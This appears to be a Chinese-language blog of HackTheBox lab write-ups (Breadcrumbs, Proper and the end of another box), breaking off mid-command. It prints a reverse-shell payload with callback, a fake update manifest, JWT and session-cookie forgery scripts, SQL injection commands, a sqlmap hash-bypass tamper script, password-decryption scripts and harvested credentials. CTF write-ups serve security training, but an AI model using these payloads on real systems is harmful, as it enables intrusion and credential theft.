electron-builder可以在google上搜到一个RCE漏洞 https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html 构造payload 123456msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.3 LPORT=9996 -f exe &gt; s\\&#x27;hell.execat latest.ymlversion: 1.2.3path: http://10.10.16.3:9999/s&#x27;hell.exesha512: pyfnrQs40RwrwKOWykgeZ0PKeSudGkN1UI/9j+PpxG4M42uY88j/hNAx7xWonk57X0GMdPIOma9FsfeBglTLMQ== 开启HTTP服务 1python3 -m http.server 9999 将latest.yml上传至client*文件夹中 12type c:\\users\\jason\\desktop\\user.txt3eda0e1bce259d8ffd4c1994f84bfdea 权限提升 12type c:\\&quot;program files&quot;\\redis\\redis.windows.confrequirepass kidvscat_yes_kidvscat 12345678910redis-cli -h 10.10.10.237 -a kidvscat_yes_kidvscatkeys *1) &quot;pk:ids:User&quot;2) &quot;pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0&quot;3) &quot;pk:ids:MetaDataClass&quot;4) &quot;pk:urn:metadataclass:ffffffff-ffff-ffff-ffff-ffffffffffff&quot;get pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0&quot;&#123;\\&quot;Id\\&quot;:\\&quot;e8e29158d70d44b1a1ba4949d52790a0\\&quot;,\\&quot;Name\\&quot;:\\&quot;Administrator\\&quot;,\\&quot;Initials\\&quot;:\\&quot;\\&quot;,\\&quot;Email\\&quot;:\\&quot;\\&quot;,\\&quot;EncryptedPassword\\&quot;:\\&quot;Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi\\&quot;,\\&quot;Role\\&quot;:\\&quot;Admin\\&quot;,\\&quot;Inactive\\&quot;:false,\\&quot;TimeStamp\\&quot;:637530169606440253&#125;&quot; 123dir c:\\users\\jason\\downloads\\d----- 4/2/2021 8:21 PM PortableKanban 存在一个密码恢复的漏洞 123456789101112#!/usr/bin/env python3import jsonimport base64from des import * # python3 -m pip install desimport sysdef decode(hash): hash = base64.b64decode(hash.encode(&#x27;utf-8&#x27;)) key = DesKey(b&quot;7ly6UznJ&quot;) return key.decrypt(hash,initial=b&quot;XuVUm5fR&quot;,padding=True).decode(&#x27;utf-8&#x27;)print(decode(&quot;Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi&quot;)) 得到kidvscat_admin_@123 evil-rm登入 12type c:\\users\\administrator\\desktop\\root.txt2b36cf6bd3cd95fc37d6e2f81e80163b 这提权部分实在是过于牵强了… HackTheBox_Breadcrumbs 端口扫描 123456789101112131415161718192021nmap -sV -sT -Pn 10.10.10.228Nmap scan report for 10.10.10.228Host is up (0.38s latency).Not shown: 992 closed portsPORTSTATE SERVICE VERSION22/tcp openssh OpenSSH for_Windows_7.7 (protocol 2.0)80/tcp openhttp Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1)135/tcp openmsrpcMicrosoft Windows RPC139/tcp opennetbios-ssn Microsoft Windows netbios-ssn443/tcp openssl/http Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1)445/tcp openmicrosoft-ds?1107/tcp filtered isoipsigport-23306/tcp openmysql?1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port3306-TCP:V=7.91%I=7%D=6/11%Time=60C2E951%P=x86_64-pc-linux-gnu%r(NUSF:LL,49,&quot;E\\0\\0\\x01\\xffj\\x04Host\\x20&#x27;10\\.10\\.16\\.3&#x27;\\x20is\\x20not\\x20alloweSF:d\\x20to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server&quot;)%r(GenericLines,SF:49,&quot;E\\0\\0\\x01\\xffj\\x04Host\\x20&#x27;10\\.10\\.16\\.3&#x27;\\x20is\\x20not\\x20allowed\\xSF:20to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server&quot;);Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows 路径扫描 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556dirb http://10.10.10.228/---- Scanning URL: http://10.10.10.228/ ----+ http://10.10.10.228/aux (CODE:403|SIZE:301)==&gt; DIRECTORY: http://10.10.10.228/books/==&gt; DIRECTORY: http://10.10.10.228/Books/+ http://10.10.10.228/cgi-bin/ (CODE:403|SIZE:301)+ http://10.10.10.228/com1 (CODE:403|SIZE:301)+ http://10.10.10.228/com2 (CODE:403|SIZE:301)+ http://10.10.10.228/com3 (CODE:403|SIZE:301)+ http://10.10.10.228/con (CODE:403|SIZE:301)==&gt; DIRECTORY: http://10.10.10.228/css/==&gt; DIRECTORY: http://10.10.10.228/db/==&gt; DIRECTORY: http://10.10.10.228/DB/+ http://10.10.10.228/examples (CODE:503|SIZE:401)==&gt; DIRECTORY: http://10.10.10.228/includes/+ http://10.10.10.228/index.php (CODE:200|SIZE:2368)==&gt; DIRECTORY: http://10.10.10.228/js/+ http://10.10.10.228/licenses (CODE:403|SIZE:420)+ http://10.10.10.228/lpt1 (CODE:403|SIZE:301)+ http://10.10.10.228/lpt2 (CODE:403|SIZE:301)+ http://10.10.10.228/nul (CODE:403|SIZE:301)==&gt; DIRECTORY: http://10.10.10.228/php/==&gt; DIRECTORY: http://10.10.10.228/PHP/+ http://10.10.10.228/phpmyadmin (CODE:403|SIZE:301)==&gt; DIRECTORY: http://10.10.10.228/portal/+ http://10.10.10.228/prn (CODE:403|SIZE:301)+ http://10.10.10.228/server-info (CODE:403|SIZE:420)+ http://10.10.10.228/server-status (CODE:403|SIZE:420)+ http://10.10.10.228/webalizer (CODE:403|SIZE:301)---- Entering directory: http://10.10.10.228/portal/ ----==&gt; DIRECTORY: http://10.10.10.228/portal/assets/+ http://10.10.10.228/portal/aux (CODE:403|SIZE:301)+ http://10.10.10.228/portal/com1 (CODE:403|SIZE:301)+ http://10.10.10.228/portal/com2 (CODE:403|SIZE:301)+ http://10.10.10.228/portal/com3 (CODE:403|SIZE:301)+ http://10.10.10.228/portal/con (CODE:403|SIZE:301)==&gt; DIRECTORY: http://10.10.10.228/portal/db/==&gt; DIRECTORY: http://10.10.10.228/portal/DB/==&gt; DIRECTORY: http://10.10.10.228/portal/includes/+ http://10.10.10.228/portal/index.php (CODE:302|SIZE:0)+ http://10.10.10.228/portal/lpt1 (CODE:403|SIZE:301)+ http://10.10.10.228/portal/lpt2 (CODE:403|SIZE:301)+ http://10.10.10.228/portal/nul (CODE:403|SIZE:301)==&gt; DIRECTORY: http://10.10.10.228/portal/php/==&gt; DIRECTORY: http://10.10.10.228/portal/PHP/+ http://10.10.10.228/portal/prn (CODE:403|SIZE:301)==&gt; DIRECTORY: http://10.10.10.228/portal/uploads/==&gt; DIRECTORY: http://10.10.10.228/portal/vendor/-----------------END_TIME: Sat Jun 12 13:42:20 2021DOWNLOADED: 9224 - FOUND: 27 漏洞利用 访问路径/php/books.php 123POST /includes/bookController.php HTTP/1.1title=a&amp;author=&amp;method=0 123POST /includes/bookController.php HTTP/1.1book=book7.html&amp;method=1 可以看到对/includes/bookController.php发起的两种POST请求 第二种请求存在LFI 12Warning: file_get_contents(..&#x2F;books&#x2F;): Failed to open stream: No such file or directory in C:\\Users\\www-data\\Desktop\\xampp\\htdocs\\includes\\bookController.php on line 28false 且Apache配置上存在目录遍历漏洞, 可以配合LFI进行文件读取 /portal/authController.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124&lt;?phprequire &#x27;db/db.php&#x27;;require &quot;cookie.php&quot;;require &quot;vendor/autoload.php&quot;;use \\Firebase\\JWT\\JWT;$errors = array();$username = &quot;&quot;;$userdata = array();$valid = false;$IP = $_SERVER[&#x27;REMOTE_ADDR&#x27;];//if user clicks on loginif($_SERVER[&#x27;REQUEST_METHOD&#x27;] === &quot;POST&quot;)&#123; if($_POST[&#x27;method&#x27;] == 0)&#123; $username = $_POST[&#x27;username&#x27;]; $password = $_POST[&#x27;password&#x27;]; $query = &quot;SELECT username,position FROM users WHERE username=? LIMIT 1&quot;; $stmt = $con-&gt;prepare($query); $stmt-&gt;bind_param(&#x27;s&#x27;, $username); $stmt-&gt;execute(); $result = $stmt-&gt;get_result(); while ($row = $result-&gt;fetch_array(MYSQLI_ASSOC))&#123; array_push($userdata, $row); &#125; $userCount = $result-&gt;num_rows; $stmt-&gt;close(); if($userCount &gt; 0)&#123; $password = sha1($password); $passwordQuery = &quot;SELECT * FROM users WHERE password=? AND username=? LIMIT 1&quot;; $stmt = $con-&gt;prepare($passwordQuery); $stmt-&gt;bind_param(&#x27;ss&#x27;, $password, $username); $stmt-&gt;execute(); $result = $stmt-&gt;get_result(); if($result-&gt;num_rows &gt; 0)&#123; $valid = true; &#125; $stmt-&gt;close(); &#125; if($valid)&#123; session_id(makesession($username)); session_start(); $secret_key = &#x27;6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e&#x27;; $data = array(); $payload = array( &quot;data&quot; =&gt; array( &quot;username&quot; =&gt; $username )); $jwt = JWT::encode($payload, $secret_key, &#x27;HS256&#x27;); setcookie(&quot;token&quot;, $jwt, time() + (86400 * 30), &quot;/&quot;); $_SESSION[&#x27;username&#x27;] = $username; $_SESSION[&#x27;loggedIn&#x27;] = true; if($userdata[0][&#x27;position&#x27;] == &quot;&quot;)&#123; $_SESSION[&#x27;role&#x27;] = &quot;Awaiting approval&quot;; &#125; else&#123; $_SESSION[&#x27;role&#x27;] = $userdata[0][&#x27;position&#x27;]; &#125; header(&quot;Location: /portal&quot;); &#125; else&#123; $_SESSION[&#x27;loggedIn&#x27;] = false; $errors[&#x27;valid&#x27;] = &quot;Username or Password incorrect&quot;; &#125; &#125; elseif($_POST[&#x27;method&#x27;] == 1)&#123; $username=$_POST[&#x27;username&#x27;]; $password=$_POST[&#x27;password&#x27;]; $passwordConf=$_POST[&#x27;passwordConf&#x27;]; if(empty($username))&#123; $errors[&#x27;username&#x27;] = &quot;Username Required&quot;; &#125; if(strlen($username) &lt; 4)&#123; $errors[&#x27;username&#x27;] = &quot;Username must be at least 4 characters long&quot;; &#125; if(empty($password))&#123; $errors[&#x27;password&#x27;] = &quot;Password Required&quot;; &#125; if($password !== $passwordConf)&#123; $errors[&#x27;passwordConf&#x27;] = &quot;Passwords don&#x27;t match!&quot;; &#125; $userQuery = &quot;SELECT * FROM users WHERE username=? LIMIT 1&quot;; $stmt = $con-&gt;prepare($userQuery); $stmt -&gt;bind_param(&#x27;s&#x27;,$username); $stmt-&gt;execute(); $result = $stmt-&gt;get_result(); $userCount = $result-&gt;num_rows; $stmt-&gt;close(); if($userCount &gt; 0)&#123; $errors[&#x27;username&#x27;] = &quot;Username already exists&quot;; &#125; if(count($errors) === 0)&#123; $password = sha1($password); $sql = &quot;INSERT INTO users(username, password, age, position) VALUES (?,?, 0, &#x27;&#x27;)&quot;; $stmt = $con-&gt;prepare($sql); $stmt -&gt;bind_param(&#x27;ss&#x27;, $username, $password); if ($stmt-&gt;execute())&#123; $user_id = $con-&gt;insert_id; header(&#x27;Location: login.php&#x27;); &#125; else&#123; $_SESSION[&#x27;loggedIn&#x27;] = false; $errors[&#x27;db_error&#x27;]=&quot;Database error: failed to register&quot;; &#125; &#125; &#125;&#125; /portal/cookie.php 123456789101112131415161718&lt;?php/** * @param string $username Username requesting session cookie * * @return string $session_cookie Returns the generated cookie * * @devteam * Please DO NOT use default PHPSESSID; our security team says they are predictable. * CHANGE SECOND PART OF MD5 KEY EVERY WEEK * */function makesession($username)&#123; $max = strlen($username) - 1; $seed = rand(0, $max); $key = &quot;s4lTy_stR1nG_&quot;.$username[$seed].&quot;(!528.\\/9890&quot;; $session_cookie = $username.md5($key); return $session_cookie;&#125; /portal/includes/fileController.php 12345678910111213141516171819202122232425262728293031323334353637&lt;?php$ret = &quot;&quot;;require &quot;../vendor/autoload.php&quot;;use \\Firebase\\JWT\\JWT;session_start();function validate()&#123; $ret = false; $jwt = $_COOKIE[&#x27;token&#x27;]; $secret_key = &#x27;6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e&#x27;; $ret = JWT::decode($jwt, $secret_key, array(&#x27;HS256&#x27;)); return $ret;&#125;if($_SERVER[&#x27;REQUEST_METHOD&#x27;] === &quot;POST&quot;)&#123; $admins = array(&quot;paul&quot;); $user = validate()-&gt;data-&gt;username; if(in_array($user, $admins) &amp;&amp; $_SESSION[&#x27;username&#x27;] == &quot;paul&quot;)&#123; error_reporting(E_ALL &amp; ~E_NOTICE); $uploads_dir = &#x27;../uploads&#x27;; $tmp_name = $_FILES[&quot;file&quot;][&quot;tmp_name&quot;]; $name = $_POST[&#x27;task&#x27;]; if(move_uploaded_file($tmp_name, &quot;$uploads_dir/$name&quot;))&#123; $ret = &quot;Success. Have a great weekend!&quot;; &#125; else&#123; $ret = &quot;Missing file or title :(&quot; ; &#125; &#125; else&#123; $ret = &quot;Insufficient privileges. Contact admin or developer to upload code. Note: If you recently registered, please wait for one of our admins to approve it.&quot;; &#125; echo $ret;&#125; /portal/php/files.php 123456789101112131415&lt;?phpsession_start();$LOGGED_IN = false;if($_SESSION[&#x27;username&#x27;] !== &quot;paul&quot;)&#123; header(&quot;Location: ../index.php&quot;);&#125;if(isset($_SESSION[&#x27;loggedIn&#x27;]))&#123; $LOGGED_IN = true; require &#x27;../db/db.php&#x27;;&#125;else&#123; header(&quot;Location: ../auth/login.php&quot;); die();&#125;?&gt; 而且files.php存在一个上传功能 以理一下攻击链 fileController.php上传文件 要求得到paul的身份 生成PHPSESSID和JWT 对于JWT 我们已经得到了签名密钥 123456#!/usr/bin/env python2import jwttoken_dict = &#123;&quot;data&quot;:&#123;&quot;username&quot;:&quot;paul&quot;&#125;&#125;headers = &#123;&quot;typ&quot;:&quot;JWT&quot;, &quot;alg&quot;:&quot;HS256&quot;&#125;jwt_token = jwt.encode(token_dict, &quot;6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e&quot;, algorithm=&quot;HS256&quot;, headers=headers).decode(&#x27;ascii&#x27;)print(jwt_token) 1eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoicGF1bCJ9fQ.4mJguG8tRd2z_feWJpmr_J3AdMeDPvW7GCK7cW7o0AI 对于PHPSESSID 12345678910&lt;?php $num = array(0, 1, 2, 3); $username = &quot;paul&quot;; foreach($num as $a) &#123; $key = &quot;s4lTy_stR1nG_&quot;.$username[$a].&quot;(!528./9890&quot;; $session_cookie = $username.md5($key); echo $session_cookie.&quot;\\n&quot;; &#125;?&gt; 1234paula2a6a014d3bee04d7df8d5837d62e8c5paul61ff9d4aaefe6bdf45681678ba89ff9dpaul8c8808867b53c49777fe5559164708c3paul47200b180ccd6835d25d034eeb6e6390 最后得到的Cookie为 1Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoicGF1bCJ9fQ.4mJguG8tRd2z_feWJpmr_J3AdMeDPvW7GCK7cW7o0AI; PHPSESSID=paul47200b180ccd6835d25d034eeb6e6390 上传ZIP时修改文件名和文件内容即可GetShell 权限提升 1type C:\\Users\\www-data\\Desktop\\xampp\\htdocs\\portal\\pizzaDeliveryUserData\\juliette.json 1234567891011&#123; &quot;pizza&quot; : &quot;margherita&quot;, &quot;size&quot; : &quot;large&quot;, &quot;drink&quot; : &quot;water&quot;, &quot;card&quot; : &quot;VISA&quot;, &quot;PIN&quot; : &quot;9890&quot;, &quot;alternate&quot; : &#123; &quot;username&quot; : &quot;juliette&quot;, &quot;password&quot; : &quot;jUli901./())!&quot;, &#125;&#125; 使用凭证juliette:jUli901./())!登入ssh服务 12345678910111213141516171819202122232425262728293031323334353637383940type C:\\Users\\juliette\\Desktop\\user.txtc5d9d568c5fc21e0dc0c5819d16aad9ftype C:\\Users\\juliette\\Desktop\\todo.html&lt;html&gt;&lt;style&gt;html&#123;background:black;color:orange;&#125;table,th,td&#123;border:1px solid orange;padding:1em;border-collapse:collapse;&#125;&lt;/style&gt;&lt;table&gt; &lt;tr&gt; &lt;th&gt;Task&lt;/th&gt; &lt;th&gt;Status&lt;/th&gt; &lt;th&gt;Reason&lt;/th&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Configure firewall for port 22 and 445&lt;/td&gt; &lt;td&gt;Not started&lt;/td&gt; &lt;td&gt;Unauthorized access might be possible&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Migrate passwords from the Microsoft Store Sticky Notes application to our new password manager&lt;/td&gt; &lt;td&gt;In progress&lt;/td&gt; &lt;td&gt;It stores passwords in plain text&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Add new features to password manager&lt;/td&gt; &lt;td&gt;Not started&lt;/td&gt; &lt;td&gt;To get promoted, hopefully lol&lt;/td&gt; &lt;/tr&gt;&lt;/table&gt;&lt;/html&gt; 寻找密码存储文件 12345dir C:\\Users\\juliette\\Documents11/29/2020 04:10 AM 4,096 plum.sqlite01/15/2021 05:10 PM 32,768 plum.sqlite-shm01/15/2021 05:10 PM 329,632 plum.sqlite-wal 复制到本地使用sqlite访问 12345678sqlite3 plum.sqlite sqlite&gt; .tablesMedia Stroke SyncState User Note StrokeMetadata UpgradedNote sqlite&gt; select * from Note;\\id=48c70e58-fcf9-475a-aea4-24ce19a9f9ec juliette: jUli901./())!\\id=fc0d8d70-055d-4870-a5de-d76943a68ea2 development: fN3)sN5Ee@g\\id=48924119-7212-4b01-9e0f-ae6d678d49b2 administrator: [MOVED]|ManagedPosition=|1|0||Yellow|0|||||||0c32c3d8-7c60-48ae-939e-798df198cfe7|8e814e57-9d28-4288-961c-31c806338c5b|637423162765765332||637423163995607122 得到凭证development:fN3)sN5Ee@g 登入ssh服务 123dir c:\\Development11/29/2020 04:11 AM 18,312 Krypter_Linux IDA反编译 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859int __cdecl main(int argc, const char **argv, const char **envp)&#123; size_t v3; // rbx __int64 v4; // rax char v6[44]; // [rsp+10h] [rbp-50h] BYREF int v7; // [rsp+3Ch] [rbp-24h] __int64 v8; // [rsp+40h] [rbp-20h] int i; // [rsp+48h] [rbp-18h] int v10; // [rsp+4Ch] [rbp-14h] std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::basic_string(v6, argv, envp); v8 = curl_easy_init(); puts( &quot;Krypter V1.2\\n&quot; &quot;\\n&quot; &quot;New project by Juliette.\\n&quot; &quot;New features added weekly!\\n&quot; &quot;What to expect next update:\\n&quot; &quot;\\t- Windows version with GUI support\\n&quot; &quot;\\t- Get password from cloud and AUTOMATICALLY decrypt!\\n&quot; &quot;***\\n&quot;); if ( argc == 2 ) &#123; v10 = 0; for ( i = 0; ; ++i ) &#123; v3 = i; if ( v3 &gt;= strlen(argv[1]) ) break; v10 += argv[1][i]; &#125; if ( v10 == 1601 ) &#123; if ( v8 ) &#123; puts(&quot;Requesting decryption key from cloud...\\nAccount: Administrator&quot;); curl_easy_setopt(v8, 10002LL, (__int64)&quot;http://passmanager.htb:1234/index.php&quot;); curl_easy_setopt(v8, 10015LL, (__int64)&quot;method=select&amp;username=administrator&amp;table=passwords&quot;); curl_easy_setopt(v8, 20011LL, (__int64)WriteCallback); curl_easy_setopt(v8, 10001LL, (__int64)v6); v7 = curl_easy_perform(v8); curl_easy_cleanup(v8); puts(&quot;Server response:\\n\\n&quot;); v4 = std::operator&lt;&lt;&lt;char&gt;(&amp;std::cout, v6); std::ostream::operator&lt;&lt;(v4, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); &#125; &#125; else &#123; puts(&quot;Incorrect master key&quot;); &#125; &#125; else &#123; puts(&quot;No key supplied.\\nUSAGE:\\n\\nKrypter &lt;key&gt;&quot;); &#125; std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::~basic_string(v6); return 0;&#125; 123netstat -ant TCP 127.0.0.1:1234 0.0.0.0:0 LISTENING InHost 用程序中的URL访问 123456789curl &quot;http://127.0.0.1:1234/index.php?method=select&amp;username=administrator&amp;table=passwords&quot;selectarray(1) &#123; [0]=&gt; array(1) &#123; [&quot;aes_key&quot;]=&gt; string(16) &quot;k19D193j.&lt;19391(&quot; &#125;&#125; 得到AES_KEY 尝试SQL注入 12345678curl &quot;http://127.0.0.1:1234/index.php?method=select&amp;username=&#x27;+or+1%23&amp;table=passwords&quot;selectarray(1) &#123; [0]=&gt; array(1) &#123; [&quot;aes_key&quot;]=&gt; string(16) &quot;k19D193j.&lt;19391(&quot; &#125;&#125; 手工注入 123456curl &quot;http://127.0.0.1:1234/index.php?method=select&amp;username=&#x27;+or+1%23&amp;table=passwords&quot;curl &quot;http://127.0.0.1:1234/index.php?method=select&amp;username=&#x27;+union+select+1%23&amp;table=passwords&quot;curl &quot;http://127.0.0.1:1234/index.php?method=select&amp;username=&#x27;+union+select+database()%23&amp;table=passwords&quot;curl &quot;http://127.0.0.1:1234/index.php?method=select&amp;username=&#x27;+union+select+group_concat(table_name)+from+information_schema.tables+where+table_schema=&#x27;bread&#x27;%23&amp;table=passwords&quot;curl &quot;http://127.0.0.1:1234/index.php?method=select&amp;username=&#x27;+union+select+group_concat(column_name)+from+information_schema.columns+where+table_name=&#x27;passwords&#x27;%23&amp;table=passwords&quot;curl &quot;http://127.0.0.1:1234/index.php?method=select&amp;username=&#x27;+union+select+group_concat(password)+from+bread.passwords%23&amp;table=passwords&quot; 得到H2dFz/jNwtSTWDURot9JBhWMP6XOdmcpgqvYHG35QKw= SSH端口映射跑SQLMap 12ssh -f -N -L 1234:127.0.0.1:1234 development@10.10.10.228sqlmap -u &quot;http://127.0.0.1:1234/index.php?method=select&amp;username=administrator&amp;table=passwords&quot; sqlmap的步骤就懒得写了 解密 12345678#!/usr/bin/env python3import base64from Crypto.Cipher import AESiv = b&#x27;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00&#x27;cipher = base64.b64decode(&quot;H2dFz/jNwtSTWDURot9JBhWMP6XOdmcpgqvYHG35QKw=&quot;)_aes = AES.new(b&quot;k19D193j.&lt;19391(&quot;, AES.MODE_CBC, iv)plain = _aes.decrypt(cipher)print(plain) 得到凭证administrator:p@ssw0rd!@#$9890./ 登入SSH服务 12type c:\\Users\\Administrator\\Desktop\\root.txtc04f72045d76a74c63a602f199a79ecd 挺综合的一台机器 HackTheBox_Proper 端口扫描 12345678nmap -sV -sT -Pn 10.10.10.231Nmap scan report for 10.10.10.231Host is up (0.081s latency).Not shown: 999 filtered portsPORT STATE SERVICE VERSION80/tcp open http Microsoft IIS httpd 10.0Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows 路径扫描 123---- Scanning URL: http://10.10.10.231/ ----==&gt; DIRECTORY: http://10.10.10.231/assets/==&gt; DIRECTORY: http://10.10.10.231/licenses/ 漏洞利用 浏览主页源码看到 1234567&lt;script type=&quot;text/javascript&quot;&gt;$(document).ready(function()&#123; &#x27;use strict&#x27;; jQuery(&#x27;#headerwrap&#x27;).backstretch([ &quot;assets/img/bg/bg1.jpg&quot;, &quot;assets/img/bg/bg3.jpg&quot; ], &#123;duration: 8000, fade: 500&#125;); $( &quot;#product-content&quot; ).load(&quot;/products-ajax.php?order=id+desc&amp;h=a1b30d31d344a5a4e41e8496ccbdd26b&quot;,function() &#123;&#125;);&#125;);&lt;/script&gt; 1curl http://10.10.10.231/products-ajax.php 123456789101112&lt;?php // [8] Undefined index: order On line 6 in file C:\\inetpub\\wwwroot\\products-ajax.php define(&#x27;SECURE_PARAM_SALT&#x27;,&#x27;hie0shah6ooNoim&#x27;); include(&#x27;functions.php&#x27;); include(&#x27;db-config.php&#x27;); if ( !$_GET[&#x27;order&#x27;] || !$_GET[&#x27;h&#x27;] ) &#123; // Set the response code to 500 http_response_code(500); // and die(). Someone fiddled with the parameters. die(&#x27;Parameter missing or malformed.&#x27;); &#125; ?&gt; 测试得到以下算法 Hash = md5(Salt+Payload) SQLMap tamper 123456789101112#!/usr/bin/env python3import osimport stringimport hashlibfrom urllib.parse import quote_plusfrom lib.core.enums import PRIORITYdef tamper(payload, **kwargs): salt = b&quot;hie0shah6ooNoim&quot; h = hashlib.md5(salt + payload.encode()).hexdigest() retVal = &quot;&#123;&#125;&amp;h=&#123;&#125;&quot;.format(payload, h) return retVal 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687sqlmap -u &quot;http://10.10.10.231/products-ajax.php?order=1&quot; --tamper=tamp.py --dbs --batch --skip-urlencodeavailable databases [3]:[*] cleaner[*] information_schema[*] testsqlmap -u &quot;http://10.10.10.231/products-ajax.php?order=1&quot; --tamper=tamp.py -D cleaner --tables --batch --skip-urlencodeDatabase: cleaner[3 tables]+-----------+| customers || licenses || products |+-----------+sqlmap -u &quot;http://10.10.10.231/products-ajax.php?order=1&quot; --tamper=tamp.py -D cleaner -T licenses --columns --batch --skip-urlencodeDatabase: cleanerTable: licenses[4 columns]+-------------+-------------+| Column | Type |+-------------+-------------+| customer_id | int(11) || id | int(11) || license | varchar(50) || product_id | int(11) |+-------------+-------------+proxychains sqlmap -u &quot;http://10.10.10.231/products-ajax.php?order=1&quot; --tamper=tamp.py -D cleaner -T licenses -D customer_id,id,license,product_id --dump --batch --skip-urlencodeDatabase: cleanerTable: licenses[18 entries]+-------------+----+--------------------------------------+------------+| customer_id | id | license | product_id |+-------------+----+--------------------------------------+------------+| 4 | 1 | 7d4cdf91-119b-414d-b16b-7cb841b2c182 | 4 || 17 | 2 | e7b59b20-8c70-48b0-91da-58bf354b18d5 | 8 || 17 | 3 | 3ea26f9c-f7c8-428f-a613-f4c66f08d0b9 | 6 || 17 | 4 | 372b02bd-8730-4bc6-a6fb-8cf9726f797b | 4 || 15 | 5 | 75ab3363-43d4-4e6b-903a-9d36919b36be | 8 || 16 | 6 | 139aff78-770c-4c59-9aef-32c4c65e68b3 | 4 || 22 | 7 | bdf82583-9f1a-42a3-b892-4b569e77f4c9 | 2 || 11 | 8 | d7da6b56-6f8c-4a26-85cc-c80860f3021a | 8 || 21 | 9 | 2ca03799-bd0d-4baa-a163-eb2a3b143f22 | 4 || 7 | 10 | 0a65e4e4-f1c7-4452-9bf0-02f4d6c35410 | 4 || 7 | 11 | 2e14ce43-8e85-43d7-b9ae-ab2c2ff64bf8 | 4 || 15 | 12 | 873f8add-2f3c-4da2-9164-649f55c1d329 | 4 || 2 | 13 | c63524b6-6346-4a34-b5c3-a3fe46593df1 | 4 || 25 | 14 | ad228131-518a-4527-8a1c-46d0723b691d | 2 || 1 | 15 | 4fa6a5cd-2081-4222-9b46-6c58df72bcfd | 8 || 1 | 16 | 183a7e47-e3cf-46f9-80fa-acb63590cc1c | 2 || 9 | 17 | 49dea5ef-3f7f-4790-9b94-b6bf29f5f893 | 2 || 4 | 18 | 41e5be3a-20fc-47b2-9dcc-c05def688cdb | 6 |+-------------+----+--------------------------------------+------------+sqlmap -u &quot;http://10.10.10.231/products-ajax.php?order=1&quot; --tamper=tamp.py -D cleaner -T customers --columns --batch --skip-urlencodeDatabase: cleanerTable: customers[4 columns]+---------------+--------------+| Column | Type |+---------------+--------------+| customer_name | varchar(50) || id | int(11) || login | varchar(255) || password | varchar(255) |+---------------+--------------+sqlmap -u &quot;http://10.10.10.231/products-ajax.php?order=1&quot; --tamper=tamp.py -D cleaner -T customers -C customer_name,id,login,password --dump --batch --skip-urlencodeDatabase: cleanerTable: customers[11 entries]+---------------------+----+------------------------------+----------------------------------+| customer_name | id | login | password |+---------------------+----+------------------------------+----------------------------------+| Vikki Solomon | 1 | vikki.solomon@throwaway.mail | 7c6a180b36896a0a8c02787eeafb0e4c || Neave Stone | 2 | nstone@trashbin.mail | 6cb75f652a9b52798eb6cf2201057c73 || Bertie McEachern | 3 | bmceachern7@discovery.moc | e10adc3949ba59abbe56e057f20f883e || Jordana Kleiser | 4 | jkleiser8@google.com.xy | 827ccb0eea8a706c4c34a16891f84e7b || Mariellen Chasemore | 5 | mchasemore9@sitemeter.moc | 25f9e794323b453885f5181f1b624d0b || Gwyneth Dornin | 6 | gdornina@marriott.moc | 5f4dcc3b5aa765d61d8327deb882cf99 || Israel Tootell | 7 | itootellb@forbes.moc | f25a2fc72690b780b2a14e140ef6a9e0 || Karon Mangham | 8 | kmanghamc@state.tx.su | 8afa847f50a716e64932d995c8e7435a || Janifer Blinde | 9 | jblinded@bing.moc | fcea920f7412b5da7be0cf42b8c93759 || Laurens Lenchenko | 10 | llenchenkoe@macromedia.moc | f806fc5a2a0d5ba2471600758452799c || Andreana Austin | 11 | aaustinf@booking.moc | 25d55ad283aa400af464c76d713c07ad |+---------------------+----+------------------------------+----------------------------------+ MD5基本都是弱口令 随意用一个凭证登入 1curl http://10.10.10.231/licenses/licenses.php?theme=&amp;h=9094e65be4a9dc27cd4af70674a99c64 12345678910111213&lt;?php // [2] include(/header.inc): failed to open stream: No such file or directory On line 36 in file C:\\inetpub\\wwwroot\\functions.php // Following function securely includes a file. Whenever we // will encounter a PHP tag we will just bail out here. function secure_include($file) &#123; if (strpos(file_get_contents($file),&#x27;&lt;?&#x27;) === false) &#123; include($file); //&lt;&lt;&lt;&lt;&lt; Error encountered in this line. &#125; else &#123; http_response_code(403); die(&#x27;Forbidden - Tampering attempt detected.&#x27;); &#125; &#125; ?&gt; 尝试RFI 1python3 -m http.server 9998 1234curl 